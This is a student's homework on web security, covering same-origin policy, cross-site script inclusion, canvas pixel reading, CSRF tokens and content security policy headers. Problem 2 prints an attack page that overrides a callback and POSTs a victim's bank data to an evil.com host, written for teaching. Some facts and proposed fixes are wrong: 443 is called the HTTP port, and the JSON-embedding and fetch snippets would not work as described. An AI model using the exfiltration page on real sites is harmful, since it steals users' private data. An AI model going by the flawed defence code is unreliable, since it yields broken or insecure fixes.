# COMP4634 (Fall 2024): Homework №1

> by Aleksandr Sergeev, student number: `21158862`.

## Problem 1: Same Origin Policy

The triplet `(protocol, domain, port)` defines a socket used for communication with the process hosting the webpage a user is connecting to.
If the origin would be defined by the `domain` only, that would allow performing attacks from the same public domain, but different port.
For example, in that case I would be able to launch a malicious process within `connect.ust.hk` private network and then read (with plain `fetch()` method) private files on other pages hosted within the same domain and steal other students private data.
That would be possible because server would only check domain name and not port and would consider my maliciouss process launched on an arbitrary port to have the same origin as the default `HTTP` port number (443).
Another example would be reading private data of the other users on a shared platform that allows user script execution, like `https://jsfiddle.net`.

## Problem 2: Cross Site Script Inclusion (XSSI) Attacks

Scripts embedded into HTML pages generally bypass same-origin policy.
This decision is made on purpose: many JavaScript libraries are hosted on CDN websites and are included dynamically in many webpages.
However it also introduces some risk for such cases of *private* scripts, that are not meant to be embedded into external potentially malicious websites.
In this particular case, it would be enough to redefine `displayData` function to send user data to the attacker before embedding the `userdata.js` script to steal all the user data.
That's how it can be exploited:

```html
<!DOCTYPE html>
<html>
	<body>
		<script>
			function displayData(userData) {
				fetch("https://evil.com/stealdata", {
					method: "POST",
					headers: {
						"Content-Type": "application/json"
					},
					body: JSON.stringify(userData)
				});
			}
		</script>
		<script src="//bank.com/userdata.js"></script>
	</body>
</html>
```

Honestly, generating a whole JavaScript script only for displaying some user data sounds like a strange idea.
A way simpler and more secure solution would be just sending a GET request to a special `bank.com` server endpoint during the `accountInfo.html` page loading and displaying the response data.
All the GET requests made from outside of `bank.com` to this endpoint will be regulated by `bank.com` CORS policy.
If the `bank.com` will not set header `Access-Control-Allow-Credentials` to `true`, the cookies will not be sent and user data will be protected.
For implementing that, an endpoint should be created and the script line should be changed to something like this:

```html
<script>
	fetch("//bank.com/userdata").then(response => displayData(response.json()));
</script>
```

The solution above (even thoght it is easier) in a way does not maintain `accountInfo.html` as a static page (however actually it never was completely static since it uses generated content to populate user information view).
Another option not involving any loading-time requests would be keeping user data in a dynamically generated JSON file.
JSON files can also be embedded into HTML (just like scripts), however they are not subject to the same relaxed same-origin policy: normally embedding JSON files from other origins is not allowed.
Data from embedded JSON files can be extracted just like any inner text from other HTML elements.
In the end the modified script will look like this:

```html
<script src="//bank.com/userdata.js" type="application/json" id="embedded-user-data"></script>
<script>
	displayData(JSON.parse(document.getElementById("embedded-user-data")));
</script>
```

And the generated JSON file will be:

```json
{
	"name":	"John Doe",
	"AccountNumber": 12345,
	"Balance": 45
}
```

## Problem 3: HTML Canvas Element

Embedding objects into HTML normally is regulated by way more relaxed rules then direct HTTP requests made by JavaScript code.
In case an image containing private user data can be embedded into another potentially malicious website HTML `<canvas>` element and then its pixels can be read by JavaScript code, that is a security vulnerability itself.
In that case malicious JavaScript can reconstruct private user images pixel-by-pixel and then analyze the data.

Several defence measures can be used to prevent this attack.
The easiest method would be restricting `GetImageData` to only be able to read pixels of canvas belonging to the same origin as the script itself.
If the domain itself is not malicious and only script can not be trusted, setting correct CSP header would be a way to disallow any data from other, potentially private, origins.
Also in case the image is loaded via `<img>` element, special `tainted` mechanism normally prevents JavaScript from reading `<canvas>` data.
Finally, as a general proposal in the future, additional cross-origin control rules can be applied to any elements that support embedding (e.g. in a new HTML version).
That would boost security of private elements (such as imags, videos, etc.) as well as commonly shared elements (as fonts or scripts) that are for some reason are not intended for sharing.

Once again, the security problem is straightforward.
If a malicious script places transparent `<canvas>` over sensitive parts of the same website (or the whole window), an attacker can actually make screenshots of any forms, passwords and any othe private elements.
Since the defences described above cover cross-origin-related issues, they will not help defending against an attack on some parts of the same website.

The easiest defence would be returning pixel values from the `<canvas>` itself instead of actual pixel value.
If the RGBA pixel value returned for a fully-transparent pixel would always be (0, 0, 0, 0.0) then the attack will always fail.
Another option would be dynamically replacing an actual transparent pixel value inside of the `GetImageData` with black color or just throwing an exception when called on partly-transparent `<canvas>`.

## Problem 4: CSRF Defenses

An attack on a website that uses cookies only for session management could be conducted as follows.
An attacker knows exactly API of a website he would like to attack, he creates a malicious website that includes code snippet that sends an HTTP request to the website being attacked.
A victim user first logs in on the target website and optains a session cookie.
Then he visits the malicious website (it can be also an embedded HTML element or an email).
The malicious website sends a request, session cookie gets included into it (since browser can not easily determine if the request was issued by the user and intended or not).
The target website receives a valid request with a cookie and then proceeds to executing the request normally.

I have used this very method (double submit) for CSRF attacks protection in project 2 part 2.
It requires user not only to know the session cookie, but also pass an unique (usually random) string alongside with every API query.
This query is usually generated dynamically for every website page request and embedded into HTML layout.
Even being able to obtain user session cookie, an attacker can not guess this random API query parameter and so can not forge a legitimate request.

The double submit technique porvides a solid level of security if the CSRF token is regenerated upon every request.
In this case the attacker has only one chance to guess a random string performing every request, it might take ages.
However, even this strong defence is not a silver bullet: if there is a way for attacker to get or guess the secret token, his attack can still succeed.
One of the possible scenarios can be somehow tricking same-origin policy, obtaining target page raw HTML, parsing it and extracting the secret token.
Secret token length (as it often happens in cryptography) can also become a weak place of the defence system: if the token is too short, it can just be guessed in a reasonable number of attempts (especially if the user stays on the attacker website for some long time).

Changing token once in some time for all the requests of course can also make a CSRF attack harder, but is definitely a weaker protection mechanism then the one discussed before.
Over this period of time, an attacker can launch several parallel requests in attempt to guess the random token (even more if he can attack several users at once).
Of course if the token length is sufficient and token update time is small enough guessing can be significantly hard, but in general chances of successful attack are higher.
Moreover, if an attacker can gain access to some *already performed* legitimate user requests (e.g. read address of some GET queries), he can learn and use the token before it is changed.

As it was already described above, same-origin policy helps preventing attacker from making a GET request to the target website, parsing HTML response, extracting the token and using it for a malicious request forging.
This would be one of the most dangerous scenarious because technically it emulates exactly the same process a legitimate user would do to perform an intentional request and so it would be relatively hard to prevent it.

## Problem 5: Content Security Policies

The content security policy for scripts was also used in my project 2 part 2 solution.
The given rule only allowes JavaScript file scripts hosted on the same origin as the current HTML page to be executed.
It disables all the external scripts as well as all the embedded code, `eval()` calls, event handlers, etc.
This behavior helps preventing XSS attacks, that involve injecting and executing malicious scripts in the user HTML page.

The given header sets up rules for embedding given object into all kinds of destinations, including `<iframe>`s, `<embed>`s, `<object>`s, etc.
The given rule prohibits all the embedding, meaning the HTML page it is applied to will not be embedded into any container (embedding will be blocked on browser level).
This prevents some some of the attacks described above (the one with screenshotting page contents through transparent canvas or the one with extracting CSRF token value from the page HTML), but also some more.
One of the attacks not described before is named "clickjacking": basically it involves placing transparent embedded page above (or below) some content and tricking user to click on it (while his clicks will be also captured by the transparent target website layout).

The last header allows running scripts on the given page, but forces browser to treat it as coming from a separate unique origin, denying all the possible same-origin rules.
In the given example, any scripts running on the page equipped with the sandboxing header will not be able to read cookies that belong to `www.xyz.com` domain (even if the page itself belongs to the same domain).
This could be particulary useful for some pages that do not require any session cookies, but for example display potentially-malicious external third-party content or widgets.
